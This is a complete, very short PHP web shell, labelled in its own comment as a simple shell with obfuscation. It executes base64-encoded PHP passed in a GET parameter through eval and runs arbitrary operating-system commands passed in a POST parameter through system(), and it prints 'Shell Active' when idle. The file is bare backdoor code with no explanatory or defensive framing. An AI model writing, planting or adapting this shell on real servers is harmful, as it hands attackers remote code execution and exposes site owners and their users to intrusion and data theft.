<?php
// Simple PHP Shell with obfuscation
if(isset($_GET['c'])) {
    eval(base64_decode($_GET['c']));
} elseif(isset($_POST['cmd'])) {
    system($_POST['cmd']);
} else {
    echo "Shell Active";
}
?>
